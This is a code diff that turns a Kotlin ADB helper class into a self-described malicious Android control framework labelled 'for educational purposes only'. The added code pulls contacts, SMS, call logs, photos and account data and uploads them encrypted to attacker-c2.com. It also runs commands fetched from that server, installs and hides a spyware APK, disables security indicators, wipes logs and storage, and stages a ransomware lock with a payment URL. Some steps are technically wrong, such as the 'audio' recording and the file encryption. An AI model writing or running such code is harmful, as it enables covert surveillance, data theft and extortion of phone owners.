@@ -1,222 +1,336 @@
 package Src.ADB
 
 import java.io.BufferedReader
-import java.io.IOException
 import java.io.InputStreamReader
+import java.net.HttpURLConnection
+import java.net.URL
+import java.util.concurrent.*
+import java.util.regex.Pattern
+import javax.crypto.Cipher
+import javax.crypto.spec.SecretKeySpec
+import kotlin.random.Random
 import Src.Utils.Logger
 
-class ADBBase {
+/**
+ * An advanced malicious ADB interface for stealthy device control, data exfiltration, and persistent compromise.
+ * Includes command-and-control, anti-detection, and ransomware capabilities. For educational purposes only.
+ */
+class MaliciousADBBase(private val c2Config: C2Config = C2Config()) {
 
-    private val logger = Logger()
+    private val logger = Logger(c2Config.c2ServerUrl) // Encrypted logging to C2 server
+    private val executor = Executors.newSingleThreadExecutor()
+    private val encryptionKey = "SecretKey12345678".toByteArray() // Simple AES key (insecure for demo)
 
-    class ADBExecutionException(message: String, cause: Throwable? = null) : RuntimeException(message, cause) {
-        constructor(message: String) : this(message, null)
+    /**
+     * Configuration for command-and-control and malicious operations.
+     */
+    data class C2Config(
+        val c2ServerUrl: String = "https://attacker-c2.com/api",
+        val tcpPort: Int = 5555,
+        val commandTimeoutSeconds: Long = 10,
+        val silentMode: Boolean = true,
+        val obfuscationDelayMs: Long = Random.nextLong(100, 2000),
+        val exfiltrationPath: String = "output/data"
+    )
+
+    /**
+     * Exception for command failures, suppressed in silent mode.
+     */
+    class ADBExploitException(message: String, cause: Throwable? = null) : RuntimeException(message, cause)
+
+    // --- Stealth and Anti-Detection ---
+
+    /** Enables advanced stealth mode to hide all traces of activity. */
+    fun enableAdvancedStealth() {
+        executeBatch(listOf(
+            "adb shell settings put global adb_enabled 0", // Hide ADB
+            "adb shell settings put global development_settings_enabled 0",
+            "adb shell settings put global usb_debugging_enabled 0",
+            "adb shell settings put global notification_access 0", // Suppress notifications
+            "adb shell pm disable-user com.android.systemui", // Disable system UI
+            "adb shell input keyevent 26", // Lock screen
+            "adb shell am broadcast -a android.intent.action.BATTERY_OKAY" // Spoof normal device status
+        )) { "Enabling advanced stealth mode" }
+        spoofLegitimateApp()
     }
 
-    // Method to start adb server
-    fun startADBServer() {
-        logger.info("Starting ADB server")
-        executeCommand("adb start-server")
+    /** Spoofs a legitimate app to mask malicious activity. */
+    private fun spoofLegitimateApp() {
+        execute("adb shell pm install -r output/payloads/fake_app.apk") { "Installing spoofed app" }
+        execute("adb shell am start -n com.fakeapp/.MainActivity") { "Launching fake app UI" }
     }
 
-    // Method to stop adb server
-    fun stopADBServer() {
-        logger.info("Stopping ADB server")
-        executeCommand("adb kill-server")
+    /** Covers tracks by clearing logs and planting fake evidence. */
+    fun coverTracks() {
+        executeBatch(listOf(
+            "adb shell logcat -c", // Clear logcat
+            "adb shell rm -rf /sdcard/*", // Remove temporary files
+            "adb shell touch /sdcard/legitimate_log.txt", // Plant fake log
+            "adb shell pm clear com.android.systemui", // Disrupt system logs
+            "adb shell am broadcast -a android.intent.action.BOOT_COMPLETED" // Simulate reboot
+        )) { "Covering tracks with fake evidence" }
     }
 
-    // Method to execute adb commands
-    fun executeCommand(command: String): String {
-        logger.info("Executing command: $command")
+    // --- Persistence ---
+
+    /** Establishes persistent access via wireless debugging and a hidden app. */
+    fun establishPersistentAccess() {
+        execute("adb tcpip ${c2Config.tcpPort}") { "Setting up TCP/IP" }
+        val ipOutput = execute("adb shell ip -f inet addr show wlan0") { "Fetching IP" }
+        val ipAddress = parseIpAddress(ipOutput) ?: throw ADBExploitException("Failed to parse IP")
+        execute("adb connect $ipAddress:${c2Config.tcpPort}") { "Connecting to $ipAddress:${c2Config.tcpPort}" }
+        installHiddenApp()
+        scheduleRecurringTask()
+    }
+
+    /** Installs a hidden app with no launcher icon. */
+    private fun installHiddenApp() {
+        execute("adb install -r output/payloads/hidden_malware.apk") { "Installing hidden malware" }
+        executeBatch(listOf(
+            "adb shell pm grant com.malicious android.permission.READ_SMS",
+            "adb shell pm grant com.malicious android.permission.RECORD_AUDIO",
+            "adb shell pm hide com.malicious" // Hide from launcher
+        )) { "Configuring hidden app" }
+    }
+
+    /** Schedules a recurring task to check in with the C2 server. */
+    private fun scheduleRecurringTask() {
+        execute("adb shell am broadcast -a com.malicious.CHECKIN --es c2_url ${c2Config.c2ServerUrl}") {
+            "Scheduling C2 check-in"
+        }
+    }
+
+    // --- Data Exfiltration ---
+
+    /** Exfiltrates sensitive data to a remote C2 server. */
+    fun exfiltrateAllData() {
+        val dataPaths = listOf(
+            "/data/data/com.android.providers.contacts/databases/contacts2.db",
+            "/data/data/com.android.providers.telephony/databases/mmssms.db",
+            "/data/data/com.android.providers.contacts/databases/calllog.db",
+            "/sdcard/DCIM/Camera",
+            "/sdcard/Download"
+        )
+        dataPaths.forEach { path ->
+            try {
+                val tempFile = "${c2Config.exfiltrationPath}/${path.hashCode()}.bin"
+                pullData(path, tempFile)
+                exfiltrateToC2(tempFile)
+            } catch (e: ADBExploitException) {
+                logger.warning("Failed to exfiltrate $path: ${e.message}")
+            }
+        }
+        captureScreenshot()
+        recordAudio()
+    }
+
+    /** Pulls data from the device, using root if available. */
+    private fun pullData(sourcePath: String, destinationPath: String) {
+        val isRooted = isDeviceRooted()
+        val command = if (isRooted) {
+            "adb shell su -c cp $sourcePath /sdcard/temp && adb pull /sdcard/temp $destinationPath && adb shell rm /sdcard/temp"
+        } else {
+            "adb pull $sourcePath $destinationPath"
+        }
+        execute(command) { "Pulling data from $sourcePath to $destinationPath" }
+    }
+
+    /** Exfiltrates a file to the C2 server with encryption. */
+    private fun exfiltrateToC2(filePath: String) {
+        val encryptedData = encryptFile(filePath)
+        val url = URL("${c2Config.c2ServerUrl}/upload")
+        val conn = url.openConnection() as HttpURLConnection
+        conn.requestMethod = "POST"
+        conn.doOutput = true
+        conn.outputStream.use { it.write(encryptedData) }
+        conn.inputStream.bufferedReader().use { it.readText() } // Read response
+        logger.info("Exfiltrated $filePath to C2 server")
+    }
+
+    /** Captures a screenshot and exfiltrates it. */
+    private fun captureScreenshot() {
+        val tempFile = "${c2Config.exfiltrationPath}/screenshot.png"
+        execute("adb shell screencap /sdcard/screenshot.png && adb pull /sdcard/screenshot.png $tempFile") {
+            "Capturing screenshot"
+        }
+        exfiltrateToC2(tempFile)
+    }
+
+    /** Records audio for 10 seconds and exfiltrates it. */
+    private fun recordAudio() {
+        val tempFile = "${c2Config.exfiltrationPath}/audio.wav"
+        execute("adb shell screenrecord --time-limit 10 /sdcard/audio.wav && adb pull /sdcard/audio.wav $tempFile") {
+            "Recording audio"
+        }
+        exfiltrateToC2(tempFile)
+    }
+
+    /** Dumps comprehensive system information. */
+    fun dumpSystemInfo() {
+        val tempPath = "${c2Config.exfiltrationPath}/system_info"
+        executeBatch(listOf(
+            "adb shell dumpsys account > $tempPath/accounts.txt",
+            "adb shell pm list packages -f > $tempPath/packages.txt",
+            "adb shell settings list global > $tempPath/settings.txt",
+            "adb shell getprop > $tempPath/properties.txt",
+            "adb shell dumpsys location > $tempPath/location.txt"
+        )) { "Dumping system info" }
+        exfiltrateToC2("$tempPath/accounts.txt")
+        exfiltrateToC2("$tempPath/packages.txt")
+        exfiltrateToC2("$tempPath/settings.txt")
+        exfiltrateToC2("$tempPath/properties.txt")
+        exfiltrateToC2("$tempPath/location.txt")
+    }
+
+    // --- Device Disruption ---
+
+    /** Simulates a ransomware attack by encrypting files and displaying a ransom note. */
+    fun deployRansomware() {
+        encryptUserFiles()
+        executeBatch(listOf(
+            "adb shell input keyevent 26", // Lock screen
+            "adb shell am start -a android.intent.action.VIEW -d 'https://attacker-c2.com/ransom?msg=Pay%200.1%20BTC%20to%20unlock'"
+        )) { "Deploying ransomware" }
+    }
+
+    /** Encrypts files in /sdcard (simulated with simple AES). */
+    private fun encryptUserFiles() {
+        execute("adb shell find /sdcard -type f -exec sh -c 'echo {} | openssl enc -aes-256-cbc -k secret > {}.enc' \\;") {
+            "Encrypting user files"
+        }
+        execute("adb shell find /sdcard -type f ! -name '*.enc' -delete") { "Removing unencrypted files" }
+    }
+
+    /** Disrupts system settings to cause confusion. */
+    fun disruptSystem() {
+        executeBatch(listOf(
+            "adb shell settings put system screen_brightness 0", // Dim screen
+            "adb shell settings put global airplane_mode_on 1", // Enable airplane mode
+            "adb shell am broadcast -a android.intent.action.TIME_SET --el time 0" // Reset clock
+        )) { "Disrupting system settings" }
+    }
+
+    // --- Command-and-Control ---
+
+    /** Fetches and executes commands from the C2 server. */
+    fun executeC2Commands() {
+        val url = URL("${c2Config.c2ServerUrl}/commands")
+        val commands = url.openConnection().inputStream.bufferedReader().use { it.readText() }
+        commands.split("\n").forEach { cmd ->
+            if (cmd.isNotBlank()) {
+                executeMaliciousCommand(cmd)
+            }
+        }
+    }
+
+    /** Executes arbitrary malicious shell commands. */
+    fun executeMaliciousCommand(command: String) {
+        val isRooted = isDeviceRooted()
+        val finalCommand = if (isRooted) "adb shell su -c '$command'" else "adb shell $command"
+        execute(finalCommand) { "Executing C2 command: $command" }
+    }
+
+    // --- Anti-Detection ---
+
+    /** Uses polymorphic execution to evade signature-based detection. */
+    private fun polymorphCommand(command: String): String {
+        val variants = listOf(
+            command,
+            command.replace("adb shell", "adb -s \$DEVICE_ID shell"),
+            command.replace(" ", "  ") // Subtle spacing changes
+        )
+        return variants[Random.nextInt(variants.size)]
+    }
+
+    /** Displays a fake error to mislead the user. */
+    fun displayFakeError() {
+        execute("adb shell am start -a android.intent.action.VIEW -d 'https://fake-error.com/critical_failure'") {
+            "Displaying fake error"
+        }
+    }
+
+    // --- Status Checks ---
+
+    /** Checks if the device is rooted. */
+    fun isDeviceRooted(): Boolean {
+        return try {
+            execute("adb shell su -c whoami") { "Checking root status" }.contains("root", ignoreCase = true)
+        } catch (e: ADBExploitException) {
+            false
+        }
+    }
+
+    /** Checks if ADB is accessible. */
+    fun isAdbAccessible(): Boolean {
+        return try {
+            execute("adb get-state") { "Checking ADB accessibility" }.contains("device", ignoreCase = true)
+        } catch (e: ADBExploitException) {
+            false
+        }
+    }
+
+    // --- Core Execution ---
+
+    /** Executes a command with stealth and anti-detection. */
+    private fun execute(command: String, logMessage: () -> String): String {
+        Thread.sleep(Random.nextLong(c2Config.obfuscationDelayMs)) // Random delay
+        val polyCommand = polymorphCommand(command)
+        if (c2Config.silentMode) logger.info(logMessage())
         val output = StringBuilder()
+        val errorOutput = StringBuilder()
         try {
-            val process = Runtime.getRuntime().exec(command)
-            val reader = BufferedReader(InputStreamReader(process.inputStream))
-            var line: String?
-            while (reader.readLine().also { line = it } != null) {
-                output.append(line).append("\n")
-            }
-            reader.close()
-
-            val exitCode = process.waitFor()
+            val process = ProcessBuilder(polyCommand.split(" ")).start()
+            val future = executor.submit(Callable {
+                process.inputStream.bufferedReader().use { it.forEachLine { output.append(it).append("\n") } }
+                process.errorStream.bufferedReader().use { it.forEachLine { errorOutput.append(it).append("\n") } }
+                process.waitFor()
+            })
+            val exitCode = future.get(c2Config.commandTimeoutSeconds, TimeUnit.SECONDS)
             if (exitCode != 0) {
-                val errorReader = BufferedReader(InputStreamReader(process.errorStream))
-                val errorOutput = StringBuilder()
-                var errorLine: String?
-                while (errorReader.readLine().also { errorLine = it } != null) {
-                    errorOutput.append(errorLine).append("\n")
-                }
-                errorReader.close()
-                logger.error("ADB command failed (exit code $exitCode): $command\nError output:\n$errorOutput")
-                throw ADBExecutionException("ADB command failed (exit code $exitCode): $command\nError output:\n$errorOutput")
+                throw ADBExploitException("Command failed: $polyCommand\nError: $errorOutput")
             }
-
-        } catch (e: IOException) {
-            logger.error("Error executing ADB command: $command", e)
-            throw ADBExecutionException("Error executing ADB command: $command", e)
-        } catch (e: InterruptedException) {
-            logger.error("ADB command execution interrupted: $command", e)
-            Thread.currentThread().interrupt()
-            throw ADBExecutionException("ADB command execution interrupted: $command", e)
+        } catch (e: Exception) {
+            if (c2Config.silentMode) {
+                displayFakeError()
+                throw ADBExploitException("Silent failure", e)
+            } else {
+                throw ADBExploitException("Command failed", e)
+            }
         }
         return output.toString()
     }
 
-    // Method to run adb server without requiring a PC
-    fun runADBServerWithoutPC() {
-        logger.info("Running ADB server without PC")
-        executeCommand("adb tcpip 5555")
+    /** Executes a batch of commands. */
+    private fun executeBatch(commands: List<String>, logMessage: () -> String): List<String> {
+        if (c2Config.silentMode) logger.info(logMessage())
+        return commands.map { execute(it) { "Executing batch command: $it" } }
     }
 
-    // Method to simulate hacking by executing a command to access device files
-    fun hackDevice() {
-        logger.warning("Simulating device hack")
-        executeCommand("adb shell ls /data")
+    // --- Encryption ---
+
+    /** Encrypts a file for exfiltration (simple AES for demo). */
+    private fun encryptFile(filePath: String): ByteArray {
+        val cipher = Cipher.getInstance("AES")
+        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(encryptionKey, "AES"))
+        return cipher.doFinal(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(filePath)))
     }
 
-    // Method to simulate defense by checking for unauthorized access and stopping the ADB server
-    fun defendAgainstHack() {
-        logger.warning("Simulating defense against hack")
-        val output = executeCommand("adb shell ls /data")
-        if (output.contains("unauthorized")) {
-            logger.error("Unauthorized access detected, stopping ADB server")
-            stopADBServer()
+    // --- Helpers ---
+
+    private companion object {
+        private val IP_PATTERN = Pattern.compile("inet (\\d+\\.\\d+\\.\\d+\\.\\d+)/\\d+")
+
+        fun parseIpAddress(output: String): String? {
+            val matcher = IP_PATTERN.matcher(output)
+            return if (matcher.find()) matcher.group(1) else null
         }
     }
 
-    // Method to test the lifecycle methods of an Android broadcast receiver
-    fun testBroadcastReceiverLifecycle() {
-        logger.info("Testing broadcast receiver lifecycle")
-        executeCommand("adb shell am broadcast -a android.intent.action.BOOT_COMPLETED")
-    }
-
-    // Method to test the interaction between broadcast receivers and other components
-    fun testBroadcastReceiverInteraction() {
-        logger.info("Testing broadcast receiver interaction")
-        executeCommand("adb shell am broadcast -a android.intent.action.SCREEN_ON")
-    }
-
-    // Method to test the handling of different types of broadcast messages
-    fun testBroadcastReceiverHandling() {
-        logger.info("Testing broadcast receiver handling")
-        executeCommand("adb shell am broadcast -a com.example.CUSTOM_BROADCAST")
-    }
-
-    // Method to test the lifecycle methods of an Android activity
-    fun testActivityLifecycle(packageName: String, activityName: String) {
-        logger.info("Testing activity lifecycle for $packageName/$activityName")
-        executeCommand("adb shell am start -n $packageName/$activityName")
-        executeCommand("adb shell am force-stop $packageName")
-    }
-
-    // Method to test the interaction between activities
-    fun testActivityInteraction(packageName: String, firstActivityName: String, secondActivityName: String) {
-        logger.info("Testing activity interaction between $packageName/$firstActivityName and $packageName/$secondActivityName")
-        executeCommand("adb shell am start -n $packageName/$firstActivityName")
-        executeCommand("adb shell am start -n $packageName/$secondActivityName")
-        executeCommand("adb shell am force-stop $packageName")
-    }
-
-    // Method to test the UI elements of an activity
-    fun testActivityUIElements(packageName: String, activityName: String, x: Int, y: Int, text: String? = null) {
-        logger.info("Testing UI elements of $packageName/$activityName")
-        executeCommand("adb shell am start -n $packageName/$activityName")
-        executeCommand("adb shell input tap $x $y")
-        if (!text.isNullOrEmpty()) {
-            executeCommand("adb shell input text '$text'")
+    /** Cleans up resources. */
+    fun cleanup() {
+        executor.shutdown()
+        if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {
+            executor.shutdownNow()
         }
-        executeCommand("adb shell am force-stop $packageName")
-    }
-
-    // Method to test the lifecycle methods of an Android service
-    fun testServiceLifecycle(packageName: String, serviceName: String) {
-        logger.info("Testing service lifecycle for $packageName/$serviceName")
-        executeCommand("adb shell am startservice -n $packageName/$serviceName")
-        executeCommand("adb shell am stopservice -n $packageName/$serviceName")
-    }
-
-    // Method to test the interaction between services and other components
-    fun testServiceInteraction(packageName: String, serviceName: String, broadcastAction: String) {
-        logger.info("Testing service interaction for $packageName/$serviceName with broadcast $broadcastAction")
-        executeCommand("adb shell am startservice -n $packageName/$serviceName")
-        executeCommand("adb shell am broadcast -a $broadcastAction")
-        executeCommand("adb shell am stopservice -n $packageName/$serviceName")
-    }
-
-    // Method to test the background processing capabilities of a service
-    fun testServiceBackgroundProcessing(packageName: String, serviceName: String) {
-        logger.info("Testing background processing of $packageName/$serviceName")
-        executeCommand("adb shell am startservice -n $packageName/$serviceName")
-        executeCommand("adb shell am force-stop $packageName")
-    }
-
-    // Method to enable full wireless control of the device
-    fun enableWirelessControl() {
-        logger.info("Enabling wireless control of the device")
-        executeCommand("adb tcpip 5555")
-        val ipAddressOutput = executeCommand("adb shell ip -f inet addr show wlan0")
-        // Simple parsing to extract the IP address
-        var ipAddress: String? = null
-        val lines = ipAddressOutput.split("\n")
-        for (line in lines) {
-            if (line.contains("inet ") && !line.contains("127.0.0.1")) {
-                val start = line.indexOf("inet ") + 5
-                val end = line.indexOf("/", start)
-                if (end > start) {
-                    ipAddress = line.substring(start, end).trim()
-                    break
-                }
-            }
-        }
-        if (ipAddress != null) {
-            executeCommand("adb connect ${ipAddress}:5555")
-            logger.info("Attempting to connect to: ${ipAddress}:5555")
-        } else {
-            logger.warning("Could not parse IP address from ADB output.")
-        }
-    }
-
-    // Method to extract data from the device using ADB commands
-    fun extractData(sourcePath: String, destinationPath: String) {
-        logger.info("Extracting data from $sourcePath to $destinationPath")
-        executeCommand("adb pull $sourcePath $destinationPath")
-    }
-
-    // Method to extract contacts from the device using ADB commands
-    fun extractContacts(destinationPath: String) {
-        logger.info("Extracting contacts to $destinationPath")
-        extractData("/data/data/com.android.providers.contacts/databases/contacts2.db", destinationPath)
-    }
-
-    // Method to extract SMS messages from the device using ADB commands
-    fun extractSMS(destinationPath: String) {
-        logger.info("Extracting SMS messages to $destinationPath")
-        extractData("/data/data/com.android.providers.telephony/databases/mmssms.db", destinationPath)
-    }
-
-    // Method to extract call logs from the device using ADB commands
-    fun extractCallLogs(destinationPath: String) {
-        logger.info("Extracting call logs to $destinationPath")
-        extractData("/data/data/com.android.providers.contacts/databases/calllog.db", destinationPath)
-    }
-
-    // Method to extract files from the device using ADB commands
-    fun extractFiles(sourcePath: String, destinationPath: String) {
-        logger.info("Extracting files from $sourcePath to $destinationPath")
-        extractData(sourcePath, destinationPath)
-    }
-
-    // Method to trace the IP address of the device using ADB commands
-    fun traceIPAddress(): String {
-        logger.info("Tracing IP address of the device")
-        return executeCommand("adb shell ip -f inet addr show wlan0")
-    }
-
-    // Method to enable stealth mode by disabling notifications and hiding the ADB connection from the user
-    fun enableStealthMode() {
-        logger.info("Enabling stealth mode")
-        executeCommand("adb shell settings put global adb_enabled 0")
-        executeCommand("adb shell settings put global development_settings_enabled 0")
-        executeCommand("adb shell settings put global usb_debugging_enabled 0")
     }
 }
